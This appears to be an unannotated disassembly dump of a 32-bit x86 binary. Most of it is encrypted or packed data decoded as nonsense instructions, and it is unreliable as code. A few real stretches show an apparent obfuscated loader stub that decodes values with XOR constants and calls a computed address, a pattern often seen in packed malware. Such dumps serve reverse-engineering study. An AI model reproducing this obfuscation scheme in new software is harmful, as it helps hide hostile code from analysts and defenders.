  412393:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  412394:	cdq    
  412395:	mov    al,0xd0
  412397:	adc    al,0x62
  412399:	cmp    eax,0x7e77a7b0
  41239e:	mov    ds:0x4effa654,eax
  4123a3:	jns    0x412353
  4123a5:	push   ebx
  4123a6:	aam    0x80
  4123a8:	(bad)  
  4123a9:	into   
  4123aa:	cld    
  4123ab:	mov    al,ds:0x864b2a74
  4123b0:	sub    BYTE PTR [ebp+0x2a0cdec1],cl
  4123b6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4123b7:	and    al,0xf2
  4123b9:	test   DWORD PTR [edx+0x59],0x5abfce5c
  4123c0:	icebp  
  4123c1:	push   ebp
  4123c2:	mov    al,ds:0xaceb5a98
  4123c7:	(bad)  
  4123c8:	in     al,0xca
  4123ca:	popa   
  4123cb:	mov    BYTE PTR [edx+0x53196ece],ch
  4123d1:	cmp    DWORD PTR [esi],ebp
  4123d3:	cmp    eax,0xd97bb04
  4123d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4123d9:	push   es
  4123da:	outs   dx,BYTE PTR ds:[esi]
  4123db:	push   0xffffff9b
  4123dd:	jo     0x4123ca
  4123df:	sbb    al,0xf4
  4123e1:	pop    esi
  4123e2:	popa   
  4123e3:	std    
  4123e4:	std    
  4123e5:	das    
  4123e6:	xchg   DWORD PTR [ecx-0x7c0dfe33],edi
  4123ec:	inc    ecx
  4123ed:	jmp    0x27dd:0xdbf5d2dd
  4123f4:	mov    ebp,0x10ac3aa5
  4123f9:	sbb    al,0xe8
  4123fb:	sub    DWORD PTR [ecx+ecx*1],esp
  4123fe:	cwde   
  4123ff:	(bad)  
  412400:	dec    esp
  412401:	cmp    al,0xe0
  412403:	pop    esp
  412404:	ret    
  412405:	mov    edi,0x76f59724
  41240a:	popf   
  41240b:	js     0x412467
  41240d:	fadd   QWORD PTR [edx]
  41240f:	lods   eax,DWORD PTR ds:[esi]
  412410:	jle    0x412444
  412412:	out    dx,al
  412413:	or     eax,0x82c8bb75
  412418:	js     0x4123ac
  41241a:	xchg   edx,eax
  41241b:	push   edi
  41241c:	sub    ebp,ebp
  41241e:	pushf  
  41241f:	popa   
  412420:	jecxz  0x4123ba
  412422:	inc    BYTE PTR [edi-0xa]
  412425:	aas    
  412426:	sbb    eax,0x850e75f2
  41242b:	stos   DWORD PTR es:[edi],eax
  41242c:	sbb    eax,0x4aac0de6
  412431:	mov    eax,0x1337e0bf
  412436:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  412437:	push   esp
  412438:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412439:	push   ebx
  41243a:	leave  
  41243b:	in     al,dx
  41243c:	sti    
  41243d:	les    esi,FWORD PTR [ebx-0x37981b82]
  412443:	aaa    
  412444:	mov    al,0xd0
  412446:	xor    BYTE PTR [ebp+edi*4+0x52],bh
  41244a:	pop    esp
  41244b:	dec    esi
  41244c:	test   DWORD PTR [ecx-0x1d4700ee],eax
  412452:	xchg   esp,eax
  412453:	test   eax,0x35ba1a91
  412458:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41245a:	cwde   
  41245b:	lock ds cmc 
  41245e:	addr16 adc eax,0x2e1ea51b
  412464:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412465:	add    ah,BYTE PTR [ecx+ebx*2]
  412468:	mov    dh,0xaf
  41246a:	retf   0x76b4
  41246d:	sar    BYTE PTR [edi+0x5d],1
  412470:	ror    ebp,1
  412472:	xlat   BYTE PTR ds:[ebx]
  412473:	xor    eax,0xf79e08d4
  412478:	sbb    ecx,DWORD PTR [eax-0x585c0b49]
  41247e:	scas   al,BYTE PTR es:[edi]
  41247f:	int3   
  412480:	arpl   WORD PTR [eax],sp
  412482:	mov    eax,0xf5fdd574
  412487:	xchg   edx,eax
  412488:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  412489:	enter  0xb9fb,0xe9
  41248d:	test   eax,0x23c63872
  412492:	shr    DWORD PTR [esi],0x1
  412495:	mov    ds:0xc2fd1b4a,eax
  41249a:	mov    fs,WORD PTR [eax-0x6aed1c92]
  4124a0:	xor    DWORD PTR [esi+esi*8+0x1908ed2],0x534771eb
  4124ab:	mov    dh,0xe7
  4124ad:	(bad)  
  4124ae:	cld    
  4124af:	inc    ah
  4124b1:	and    eax,0x9f336674
  4124b6:	mov    ah,0x25
  4124b8:	sub    al,0xe1
  4124ba:	or     DWORD PTR [ecx-0x522a3cd9],esp
  4124c0:	(bad)  
  4124c1:	(bad)  
  4124c2:	in     eax,0xad
  4124c4:	mov    cs,WORD PTR [ebx+0xca1f8e2]
  4124ca:	mov    ebp,0x2b364789
  4124cf:	fisubr DWORD PTR [ecx-0x22753e1c]
  4124d5:	js     0x412457
  4124d7:	add    eax,0x7aab7594
  4124dc:	add    eax,DWORD PTR [ebp+0x8]
  4124df:	mov    DWORD PTR [ebp-0x10],eax
  4124e2:	mov    eax,DWORD PTR [ebp-0x1c]
  4124e5:	test   eax,eax
  4124e7:	je     0x4129b7
  4124ed:	mov    DWORD PTR [ebp-0x24],esi
  4124f0:	push   0xb
  4124f2:	pop    ecx
  4124f3:	push   0x5
  4124f5:	dec    ecx
  4124f6:	pop    ebx
  4124f7:	xchg   ebx,ecx
  4124f9:	sub    ebx,ecx
  4124fb:	xchg   ebx,ecx
  4124fd:	dec    ecx
  4124fe:	mov    eax,DWORD PTR [ebp-0x1c]
  412501:	imul   eax,ecx
  412504:	sub    esp,eax
  412506:	mov    DWORD PTR [ebp-0x24],esp
  412509:	mov    eax,DWORD PTR [ebp-0x4]
  41250c:	mov    ecx,0x7510851
  412511:	xor    eax,ecx
  412513:	mov    edx,0x327299
  412518:	add    eax,edx
  41251a:	mov    DWORD PTR [ebp+0x8],eax
  41251d:	mov    eax,DWORD PTR [ebp-0x18]
  412520:	xor    eax,ecx
  412522:	add    eax,edx
  412524:	mov    edx,DWORD PTR [ebp+0x14]
  412527:	imul   eax,DWORD PTR [edx]
  41252a:	mov    edx,DWORD PTR [ebp-0x4]
  41252d:	xor    edx,ecx
  41252f:	mov    ecx,DWORD PTR [ebp+0x8]
  412532:	lea    ecx,[edx+ecx*1+0x327299]
  412539:	cmp    ecx,eax
  41253b:	je     0x4129b2
  412541:	mov    edi,DWORD PTR [ebp-0x18]
  412544:	mov    eax,DWORD PTR [ebp+0x8]
  412547:	mov    edx,DWORD PTR [ebp+0x14]
  41254a:	mov    eax,DWORD PTR [edx+eax*4+0x4]
  41254e:	mov    ecx,0x7510851
  412553:	xor    edx,edx
  412555:	xor    edi,ecx
  412557:	mov    esi,0x327299
  41255c:	add    edi,esi
  41255e:	div    edi
  412560:	mov    edx,DWORD PTR [ebp-0x4]
  412563:	xor    edx,ecx
  412565:	lea    eax,[edx+eax*1+0x327299]
  41256c:	mov    edx,DWORD PTR [ebp+0x8]
  41256f:	mov    edi,DWORD PTR [ebp-0x24]
  412572:	mov    DWORD PTR [edi+edx*4],eax
  412575:	mov    eax,DWORD PTR [ebp-0x18]
  412578:	mov    edx,DWORD PTR [ebp+0x8]
  41257b:	xor    eax,ecx
  41257d:	lea    eax,[eax+edx*1+0x327299]
  412584:	mov    DWORD PTR [ebp+0x8],eax
  412587:	mov    eax,DWORD PTR [ebp-0x18]
  41258a:	mov    edx,DWORD PTR [ebp+0x14]
  41258d:	jmp    0x41278d
  412592:	inc    esp
  412593:	mov    edx,0x5c849cfa
  412598:	pop    esp
  412599:	push   edx
  41259a:	outs   dx,BYTE PTR ds:[esi]
  41259b:	outs   dx,DWORD PTR ds:[esi]
  41259c:	stos   DWORD PTR es:[edi],eax
  41259d:	(bad)  
  41259e:	jmp    0x5984ab28
  4125a3:	pop    ebp
  4125a4:	jle    0x412624
  4125a6:	pop    ecx
  4125a7:	jg     0x412627
  4125a9:	jle    0x41253a
  4125ab:	mov    DWORD PTR [eax+0x7],edx
  4125ae:	hlt    
  4125af:	jne    0x4125ad
  4125b1:	jno    0x41254c
  4125b3:	js     0x4125a6
  4125b5:	stos   DWORD PTR es:[edi],eax
  4125b6:	xor    edi,ecx
  4125b8:	jl     0x412572
  4125ba:	(bad)  
  4125bb:	adc    DWORD PTR [eax],esp
  4125bd:	add    eax,DWORD PTR [edi+0x709cbfe1]
  4125c3:	dec    ebx
  4125c4:	dec    esi
  4125c5:	or     edi,DWORD PTR ds:0xf2e327ac
  4125cb:	(bad)  
  4125cd:	fadd   st(1),st
  4125cf:	add    DWORD PTR [esp+ebx*1-0x668ec693],esp
  4125d6:	dec    edx
  4125d7:	mov    ds:0x3b1fb685,al
  4125dc:	jno    0x412610
  4125de:	xchg   ch,al
  4125e0:	inc    eax
  4125e1:	jg     0x412618
  4125e3:	rcl    BYTE PTR [ebx-0x45],0x64
  4125e7:	pop    ds
  4125e8:	ds stos BYTE PTR es:[edi],al
  4125ea:	xchg   edi,edi
  4125ec:	imul   esp,DWORD PTR [ebx+eax*1],0x2e
  4125f0:	pop    esp
  4125f1:	popf   
  4125f2:	adc    al,0x7
  4125f4:	out    dx,al
  4125f5:	jmp    0x412595
  4125f7:	dec    edi
  4125f8:	outs   dx,DWORD PTR ds:[esi]
  4125f9:	pop    ss
  4125fa:	dec    esi
  4125fb:	xchg   edi,eax
  4125fc:	xor    eax,0x9114d656
  412601:	jno    0x4125a3
  412603:	add    DWORD PTR [esi-0x5233e55c],0xa3388c85
  41260d:	mov    BYTE PTR [edi+0x39],cl
  412610:	test   cl,ch
  412612:	pusha  
  412613:	lock push 0x8627a9e3
  412619:	call   0x99f7:0xe2adc1d9
  412620:	jge    0x412690
  412622:	adc    DWORD PTR [ecx-0x3db41eaf],0x22
  412629:	adc    bh,BYTE PTR [ecx+0x20]
  41262c:	fsub   DWORD PTR [edi-0x57]
  41262f:	cmp    BYTE PTR [ebx+0x6f],al
  412632:	push   esi
  412633:	fisub  WORD PTR [edi-0x74609459]
  412639:	mov    ds:0xfc80d3c0,eax
  41263e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41263f:	sub    eax,0xc0ebffd6
  412644:	loopne 0x41262d
  412646:	rcl    BYTE PTR [edi+edx*8-0x2],cl
  41264a:	xchg   esp,eax
  41264b:	test   al,0x8a
  41264d:	ja     0x4125f5
  41264f:	xor    ebp,DWORD PTR [ebp+0x1d]
  412652:	mov    BYTE PTR [edx],al
  412654:	lods   eax,DWORD PTR ds:[esi]
  412655:	dec    cl
  412657:	pop    es
  412658:	popf   
  412659:	mov    al,0x90
  41265b:	fadd   DWORD PTR [eax+esi*4]
  41265e:	push   cs
  41265f:	mov    bl,0xf1
  412661:	xchg   ecx,eax
  412662:	stos   BYTE PTR es:[edi],al
  412663:	(bad)  
  412664:	adc    eax,0xea70886a
  412669:	jnp    0x412665
  41266b:	call   0xa0e9:0x966a9ba3
  412672:	divps  xmm2,XMMWORD PTR [ebp-0x13]
  412676:	test   dl,0x9
  412679:	jb     0x412673
  41267b:	mov    dl,0xae
  41267d:	dec    edx
  41267e:	cld    
  41267f:	outs   dx,BYTE PTR ds:[esi]
  412680:	inc    esp
  412681:	inc    esi
  412682:	push   ss
  412683:	and    edx,eax
  412685:	scas   al,BYTE PTR es:[edi]
  412686:	xchg   ebx,eax
  412687:	cmp    BYTE PTR [ecx+0x7e7cc8c7],ah
  41268d:	push   esp
  41268e:	jle    0x41268d
  412690:	js     0x412692
  412692:	stc    
  412693:	mov    ds:0x267bda4a,al
  412698:	sbb    eax,0x27fd3b1b
  41269d:	lahf   
  41269e:	call   0xb93:0x66cc3bbe
  4126a5:	fisubr DWORD PTR [edi]
  4126a7:	test   BYTE PTR [ecx+eax*8],bh
  4126aa:	inc    ebp
  4126ab:	popa   
  4126ac:	in     eax,dx
  4126ad:	push   0xffffffb8
  4126af:	aam    0xb9
  4126b1:	and    esi,ebx
  4126b3:	imul   ebp,DWORD PTR [esi+0x605f4a49],0xffffffcc
  4126ba:	jmp    0x4126e7
  4126bc:	hlt    
  4126bd:	shl    DWORD PTR [ebx],0xcc
  4126c0:	dec    ebp
  4126c1:	mov    al,0x28
  4126c3:	test   DWORD PTR [ebx-0x34f47b2c],esi
  4126c9:	adc    cl,ch
  4126cb:	cmc    
  4126cc:	push   edi
  4126cd:	fisttp QWORD PTR [ebp+ebp*1-0x4b]
  4126d1:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4126d2:	mov    ebp,ds
  4126d4:	js     0x4126fd
  4126d6:	adc    eax,0xf43753e7
  4126db:	in     eax,dx
  4126dc:	and    edi,DWORD PTR [edi]
  4126de:	sub    al,0x10
  4126e0:	push   es
  4126e1:	mov    BYTE PTR [ebp-0x32a6dda7],dl
  4126e7:	fistp  QWORD PTR [esi+0x7407ca8e]
  4126ed:	sbb    BYTE PTR [eax+0x3],cl
  4126f0:	es sti 
  4126f2:	ret    0x7a7d
  4126f5:	mov    esi,0xe357eac4
  4126fa:	xlat   BYTE PTR ds:[ebx]
  4126fb:	pop    esp
  4126fc:	jecxz  0x4126de
  4126fe:	cwde   
  4126ff:	in     al,dx
  412700:	cmp    BYTE PTR [eax],0x31
  412703:	popa   
  412704:	jmp    0x688d:0x8a5f47b4
  41270b:	fs ret 0x3190
  41270f:	jnp    0x412725
  412711:	mov    al,ds:0x4663efd6
  412716:	ret    0x434f
  412719:	jle    0x4126ef
  41271b:	adc    DWORD PTR [esi],ebx
  41271d:	jg     0x4126f3
  41271f:	clc    
  412720:	mov    ch,0x7f
  412722:	into   
  412723:	jmp    0x4126e5
  412725:	xor    al,0xe0
  412727:	sbb    DWORD PTR [eiz*1+0x61e56951],0x1f
  41272f:	leave  
  412730:	imul   ecx,DWORD PTR [eax-0x2f],0x6d
  412734:	(bad)  [edi]
  412736:	cmp    cl,0x79
  412739:	cmp    BYTE PTR [ecx+0x74],cl
  41273c:	jmp    0x41279d
  41273e:	daa    
  41273f:	cli    
  412740:	aad    0x0
  412742:	add    cl,0x6c
  412745:	mov    WORD PTR [edx+0x66],fs
  412748:	fwait
  412749:	shl    DWORD PTR [esi-0x68],cl
  41274c:	or     edx,DWORD PTR ds:0xce266cf2
  412752:	setg   BYTE PTR [ecx]
  412755:	call   0x721c:0xcd50ccce
  41275c:	fcom   st(6)
  41275e:	call   FWORD PTR [esi+edi*1]
  412761:	jg     0x4126f3
  412763:	aam    0xf7
  412765:	jp     0x4127d8
  412767:	ret    0x4b7f
  41276a:	cmp    al,0x66
  41276c:	lock pop es
  41276e:	les    edi,FWORD PTR [eax]
  412770:	jmp    0x36af0d06
  412775:	inc    ebx
  412776:	stos   DWORD PTR es:[edi],eax
  412777:	enter  0x168d,0x20
  41277b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41277c:	cmp    eax,0xbce07fa2
  412781:	cmp    cl,BYTE PTR [ebx-0x1c]
  412784:	inc    edx
  412785:	pop    ebx
  412786:	enter  0xfd73,0xd0
  41278a:	rol    al,0x7f
  41278d:	xor    eax,ecx
  41278f:	jmp    0x41298f
  412794:	aaa    
  412795:	cmp    al,0xc7
  412797:	cdq    
  412798:	int    0x75
  41279a:	jno    0x412758
  41279c:	ja     0x41277e
  41279e:	loope  0x4127ba
  4127a0:	data16 (bad) 
  4127a2:	das    
  4127a3:	sbb    al,0x44
  4127a5:	pop    edi
  4127a6:	jle    0x412826
  4127a8:	pop    ecx
  4127a9:	jg     0x412829
  4127ab:	jle    0x41277b
  4127ad:	cmc    
  4127ae:	lahf   
  4127af:	call   0x4fc2:0x6759fddb
  4127b6:	ret    0x4f1f
  4127b9:	sbb    DWORD PTR [ebp+ebx*4-0x701d87b9],ebp
  4127c0:	dec    edx
  4127c1:	sbb    ebp,DWORD PTR [ecx-0x7103a861]
  4127c7:	push   edx
  4127c8:	jecxz  0x41276d
  4127ca:	jg     0x41282c
  4127cc:	adc    ch,ah
  4127ce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4127cf:	sar    bh,1
  4127d1:	pop    ss
  4127d2:	je     0x412830
  4127d4:	arpl   WORD PTR [eax],bx
  4127d6:	mov    dl,BYTE PTR [ecx]
  4127d8:	mov    dl,0x81
  4127da:	jg     0x412807
  4127dc:	in     al,dx
  4127dd:	or     eax,0x8223639b
  4127e2:	add    BYTE PTR [ebx],ch
  4127e4:	add    BYTE PTR [ebx],0x50
  4127e7:	cli    
  4127e8:	shl    edi,1
  4127ea:	cli    
  4127eb:	cld    
  4127ec:	(bad)  
  4127ee:	jmp    0x4127d9
  4127f0:	and    eax,0x7547d420
  4127f5:	push   0xe4873662
  4127fa:	xchg   edx,eax
  4127fb:	mov    al,0x88
  4127fd:	enter  0x4226,0x6
  412801:	mov    cl,0x19
  412803:	add    al,0x70
  412805:	das    
  412806:	jae    0x412850
  412808:	xchg   ebx,eax
  412809:	and    eax,0xd691c9af
  41280e:	sub    bh,dl
  412810:	mov    eax,ds:0x884f8906
  412815:	inc    ecx
  412816:	pop    ecx
  412817:	inc    esi
  412818:	add    eax,0x5ab77d9e
  41281d:	int3   
  41281e:	int    0x7
  412820:	out    0xc,al
  412822:	ds pop eax
  412824:	and    ebx,DWORD PTR [ebp+0x47deccb]
  41282a:	or     edx,DWORD PTR [ebx+0x5876fd1c]
  412830:	(bad)  
  412832:	fisttp WORD PTR [edx]
  412834:	outs   dx,BYTE PTR ds:[esi]
  412835:	mov    DWORD PTR [edx-0x16b38103],ecx
  41283b:	dec    edi
  41283c:	mov    WORD PTR [ecx+0x3db5e52f],cs
  412842:	mov    ds:0x1ffebc2d,eax
  412847:	add    ebx,DWORD PTR [eax]
  412849:	out    dx,eax
  41284a:	pushf  
  41284b:	sbb    dh,ch
  41284d:	sub    eax,0x344ad3ab
  412852:	test   BYTE PTR [edi+0x1b5f1dc9],dh
  412858:	pop    ds
  412859:	dec    ax
  41285b:	xor    eax,DWORD PTR [edx]
  41285d:	test   BYTE PTR [edi-0x3848af46],ch
  412863:	aas    
  412864:	cmp    al,0xb9
  412866:	sar    BYTE PTR [ebx-0x13],1
  412869:	mov    bl,0xf1
  41286b:	jecxz  0x41281c
  41286d:	mov    bl,0x7b
  41286f:	jmp    0x4128cf
  412871:	sahf   
  412872:	stc    
  412873:	xchg   DWORD PTR [edx],eax
  412875:	mov    ch,0x30
  412877:	cmp    eax,0xdf3354f7
  41287c:	and    BYTE PTR [esi+0x33],0xe3
  412880:	inc    edx
  412881:	leave  
  412882:	or     DWORD PTR [edi-0x161c7177],ecx
  412888:	js     0x4128dd
  41288a:	sbb    eax,0x81b1ba28
  41288f:	neg    DWORD PTR [edx+0x10cca10b]
  412895:	repnz nop
  412897:	scas   eax,DWORD PTR es:[edi]
  412898:	push   ss
  412899:	(bad)  
  41289a:	xor    cl,BYTE PTR [esi]
  41289c:	mov    cl,0xe7
  41289e:	(bad)  [edx]
  4128a0:	dec    eax
  4128a1:	mov    ds:0x95d635ea,eax
  4128a6:	lods   eax,DWORD PTR ds:[esi]
  4128a7:	adc    eax,0x9dc923c8
  4128ac:	repz and al,0x3a
  4128af:	pusha  
  4128b0:	push   0xa5472ba2
  4128b5:	(bad)  
  4128b6:	aad    0x55
  4128b8:	xchg   esp,eax
  4128b9:	sub    eax,0x30fc75ea
  4128be:	rcl    BYTE PTR [ecx],0x3
  4128c1:	jecxz  0x41284c
  4128c3:	add    bh,BYTE PTR [edi-0x6b]
  4128c6:	and    al,0xa
  4128c8:	sub    al,0xf7
  4128ca:	rcr    BYTE PTR [esi+0x44a9b135],1
  4128d0:	xor    eax,0x4457f01d
  4128d5:	add    BYTE PTR [ebx-0x3db1ee90],bl
  4128db:	mov    dh,0xd5
  4128dd:	in     eax,0x48
  4128df:	mov    ebp,0xaaa7bdcf
  4128e4:	cdq    
  4128e5:	je     0x41290c
  4128e7:	popa   
  4128e8:	rol    DWORD PTR [ebp-0x58cee94a],1
  4128ee:	add    eax,0xe7301e84
  4128f3:	adc    al,0xa1
  4128f5:	rol    cl,1
  4128f7:	sbb    eax,0x8defa365
  4128fc:	jmp    0x41293d
  4128fe:	mov    esp,0xee0d51a7
  412903:	adc    ebp,edx
  412905:	sub    DWORD PTR [ecx-0x19],0xa3bf7a76
  41290c:	push   edi
  41290d:	hlt    
  41290e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41290f:	pop    ebp
  412910:	add    al,0xc5
  412912:	imul   edx,DWORD PTR [edx-0x1b741aad],0x208e07e8
  41291c:	pop    ebx
  41291d:	in     al,dx
  41291e:	mov    ah,0xc4
  412920:	sub    edi,DWORD PTR [eax+0x733b16e9]
  412926:	mov    ds:0x6d379019,al
  41292b:	pop    esi
  41292c:	inc    esi
  41292d:	jbe    0x412937
  41292f:	jmp    0x4128c1
  412931:	stos   DWORD PTR es:[edi],eax
  412932:	lock mov WORD PTR gs:[edx-0x53d41980],?
  41293a:	sbb    eax,DWORD PTR [ebx+0x7e11616b]
  412940:	ror    BYTE PTR [esp+ebx*4],cl
  412943:	lods   eax,DWORD PTR ds:[esi]
  412944:	imul   esp,DWORD PTR [eax],0x1de9125c
  41294a:	sub    DWORD PTR [edi],esi
  41294c:	push   ss
  41294d:	cwde   
  41294e:	push   0x25
  412950:	push   eax
  412951:	clc    
  412952:	xlat   BYTE PTR ds:[ebx]
  412953:	cmp    BYTE PTR [ecx-0xd55d150],dl
  412959:	test   dl,al
  41295b:	popa   
  41295c:	(bad)  
  41295d:	fwait
  41295e:	or     BYTE PTR [edi],ah
  412960:	pop    ebx
  412961:	inc    esi
  412962:	sbb    DWORD PTR [eax-0x5a870109],edx
  412968:	ret    
  412969:	and    ebx,DWORD PTR [ecx]
  41296b:	sbb    eax,edx
  41296d:	sbb    al,0x50
  41296f:	push   0x36cc069b
  412974:	repnz scas al,BYTE PTR es:[edi]
  412976:	jl     0x412998
  412978:	mov    cl,0xf5
  41297a:	mov    dl,0xda
  41297c:	inc    edi
  41297d:	or     DWORD PTR [esi],0xffffffa0
  412980:	pop    ecx
  412981:	ins    DWORD PTR es:[edi],dx
  412982:	ja     0x4129e2
  412984:	repnz (bad) 
  412986:	loopne 0x41291c
  412988:	lea    edi,[ebp+0x4d]
  41298b:	out    dx,eax
  41298c:	cdq    
  41298d:	enter  0x345,0xc6
  412991:	imul   eax,DWORD PTR [edx]
  412994:	mov    edx,DWORD PTR [ebp-0x4]
  412997:	xor    edx,ecx
  412999:	mov    ecx,DWORD PTR [ebp+0x8]
  41299c:	lea    ecx,[edx+ecx*1+0x327299]
  4129a3:	cmp    ecx,eax
  4129a5:	jne    0x412541
  4129ab:	mov    ebx,esi
  4129ad:	jmp    0x4129b7
  4129b2:	mov    ebx,0x327299
  4129b7:	mov    eax,DWORD PTR [ebp-0x4]
  4129ba:	xor    eax,0x7510851
  4129bf:	add    eax,ebx
  4129c1:	mov    DWORD PTR [ebp-0xc],eax
  4129c4:	xor    ebx,ebx
  4129c6:	lea    eax,[ebp-0x10]
  4129c9:	add    ebx,DWORD PTR [eax]
  4129cb:	call   ebx
  4129cd:	xor    ebx,ebx
  4129cf:	inc    ebx
  4129d0:	cmp    DWORD PTR [ebp+0x10],ebx
  4129d3:	je     0x412bf1
  4129d9:	xchg   edx,eax
  4129da:	push   0xa
  4129dc:	pop    ecx
  4129dd:	jmp    0x412bdd
  4129e2:	jmp    0x757c:0x13b47be7
  4129e9:	popa   
  4129ea:	cmc    
  4129eb:	xchg   dh,dl
  4129ed:	fadd   DWORD PTR [edx+ebp*1+0x59a7b17b]
  4129f4:	jle    0x412a74
  4129f6:	pop    ecx
  4129f7:	jg     0x412a77
  4129f9:	jle    0x412a2d
  4129fb:	stos   BYTE PTR es:[edi],al
  4129fc:	das    
  4129fd:	inc    edi
  4129fe:	and    edi,DWORD PTR [ecx]
  412a00:	loop   0x412a4a
  412a02:	xchg   ebp,eax
  412a03:	push   cs
  412a04:	test   eax,0x8ba50d65
  412a09:	ins    DWORD PTR es:[edi],dx
  412a0a:	push   ebp
  412a0b:	stos   BYTE PTR es:[edi],al
  412a0c:	mov    ?,WORD PTR [esi+0x4f]
  412a0f:	test   edi,eax
  412a11:	mov    eax,ds:0x3b8ee1c2
  412a16:	pop    edi
  412a17:	fisttp WORD PTR [esi+0x78681efb]
  412a1d:	jno    0x412a74
  412a1f:	mov    bh,0xbc
  412a21:	outs   dx,DWORD PTR ds:[esi]
  412a22:	dec    ecx
  412a23:	add    BYTE PTR [ecx+0x29],ah
  412a26:	push   ecx
  412a27:	mov    ebx,DWORD PTR [ebp-0x31]
  412a2a:	scas   eax,DWORD PTR es:[edi]
  412a2b:	loopne 0x412a67
  412a2d:	data16 daa 
  412a2f:	xchg   ebx,eax
  412a30:	imul   esi,esp,0xfffffffb
  412a33:	and    ah,al
  412a35:	sub    BYTE PTR [edi+edx*4-0x74ae271c],cl
  412a3c:	bound  edi,QWORD PTR [ecx]
  412a3e:	out    dx,al
  412a3f:	test   BYTE PTR [ecx+eax*4],dl
  412a42:	aas    
  412a43:	push   edx
  412a44:	rcl    BYTE PTR [esi],1
  412a46:	aad    0xa
  412a48:	add    al,0x38
  412a4a:	loopne 0x412a1d
  412a4c:	pop    esi
  412a4d:	fisub  DWORD PTR [eiz*1+0x4a65360e]
  412a54:	jl     0x412a4b
  412a56:	pop    ebp
  412a57:	inc    edi
  412a58:	push   ebp
  412a59:	push   ebp
  412a5a:	sub    BYTE PTR [edx+edi*8+0x52],bh
  412a5e:	mov    eax,ds:0x73e45812
  412a63:	pop    es
  412a64:	adc    edx,DWORD PTR [eax*4+0x382ecf9f]
  412a6b:	xor    al,0xe3
  412a6d:	jno    0x412a2c
  412a6f:	mov    dl,0xc5
  412a71:	cdq    
  412a72:	inc    esp
  412a73:	mov    DWORD PTR [edx],ebx
  412a75:	clc    
  412a76:	xor    al,0x43
  412a78:	ins    DWORD PTR es:[edi],dx
  412a79:	dec    esi
  412a7a:	mov    bh,0xfe
  412a7c:	repnz in al,0xbe
  412a7f:	sbb    al,0x5
  412a81:	gs addr16 xchg ebx,eax
  412a84:	shl    DWORD PTR [ebx-0x67],0xa6
  412a88:	shl    DWORD PTR [edi+0x4d3fc39f],1
  412a8e:	push   esi
  412a8f:	(bad)  
  412a90:	pop    ecx
  412a91:	(bad)  
  412a93:	jmp    0x412ab8
  412a95:	pop    esp
  412a96:	jge    0x412a86
  412a98:	sub    cl,BYTE PTR ds:0xc86a5610
  412a9e:	dec    edi
  412a9f:	nop
  412aa0:	cdq    
  412aa1:	fwait
  412aa2:	pop    edi
  412aa3:	rol    DWORD PTR [eax+0x71173a48],1
  412aa9:	test   DWORD PTR [edi],edx
  412aab:	test   eax,0xa4620174
  412ab0:	shl    BYTE PTR [ecx-0x71b7cefb],0xd1
  412ab7:	fadd   st,st(4)
  412ab9:	and    ch,BYTE PTR [esp+esi*2]
  412abc:	mov    ds:0x26ad9d57,eax
  412ac1:	popa   
  412ac2:	data16 out dx,al
  412ac4:	add    DWORD PTR [ecx-0x70e0e3b],ebx
  412aca:	sar    BYTE PTR [esi],cl
  412acc:	or     ch,BYTE PTR [edx+0x11a74fc5]
  412ad2:	imul   ebx,DWORD PTR [ebp+0x1e],0xffffffba
  412ad6:	adc    al,0x77
  412ad8:	or     al,0x41
  412ada:	cmp    BYTE PTR [esi-0x43],0xea
  412ade:	pushf  
  412adf:	ret    
  412ae0:	(bad)  
  412ae1:	jmp    DWORD PTR [edx+0x7877a9f4]
  412ae7:	arpl   ax,sp
  412ae9:	sub    ah,ah
  412aeb:	pop    eax
  412aec:	enter  0xdef,0x8
  412af0:	xor    eax,0xbe6c990
  412af5:	stos   BYTE PTR es:[edi],al
  412af6:	test   al,0x61
  412af8:	mov    ebp,0xb5f12bc2
  412afd:	sbb    BYTE PTR [eax],dl
  412aff:	or     DWORD PTR [ecx],0x12d9e4ec
  412b05:	sub    DWORD PTR [esi],0x10
  412b08:	fcmovne st,st(2)
  412b0a:	loop   0x412b4f
  412b0c:	jle    0x412b80
  412b0e:	mov    esp,DWORD PTR [esi-0x51]
  412b11:	fld    QWORD PTR [ebp+ecx*8+0x1]
  412b15:	cmp    al,0x95
  412b17:	int    0x5a
  412b19:	or     BYTE PTR [edx+ecx*2-0x5089dae0],cl
  412b20:	push   edi
  412b21:	xor    eax,0x8fd27a6b
  412b26:	push   0xffffffd6
  412b28:	inc    edi
  412b29:	into   
  412b2a:	cli    
  412b2b:	arpl   WORD PTR [edx+eiz*1],bx
  412b2e:	inc    edi
  412b2f:	adc    esi,DWORD PTR [eax+eiz*4-0x13]
  412b33:	ds mov edx,0x606239d2
  412b39:	rol    BYTE PTR [ebp-0x73],cl
  412b3c:	push   ebp
  412b3d:	scas   al,BYTE PTR es:[edi]
  412b3e:	mov    eax,ds:0xcce0c1f
  412b43:	and    eax,0x37fa288d
  412b48:	cmp    eax,0x4f43a9ed
  412b4d:	popa   
  412b4e:	and    bh,0x76
  412b51:	(bad)  
  412b52:	rol    ch,1
  412b54:	fist   WORD PTR [ebp-0x219a884]
  412b5a:	jle    0x412b7a
  412b5c:	lea    edi,[ecx-0x51]
  412b5f:	mov    fs,esp
  412b61:	push   0x58
  412b63:	push   ebp
  412b64:	pop    ecx
  412b65:	mov    dh,cl
  412b67:	xchg   ebx,eax
  412b68:	popa   
  412b69:	mov    dh,0xca
  412b6b:	and    al,al
  412b6d:	push   cs
  412b6e:	pop    ds
  412b6f:	pop    esi
  412b70:	inc    ebx
  412b71:	(bad)  
  412b72:	cld    
  412b73:	sbb    esp,DWORD PTR [ebp-0x5]
  412b76:	iret   
  412b77:	int    0xec
  412b79:	out    0x99,al
  412b7b:	dec    eax
  412b7c:	les    esp,FWORD PTR [eax+0xb74d40d]
  412b82:	push   ss
  412b83:	sbb    eax,0xae6de256
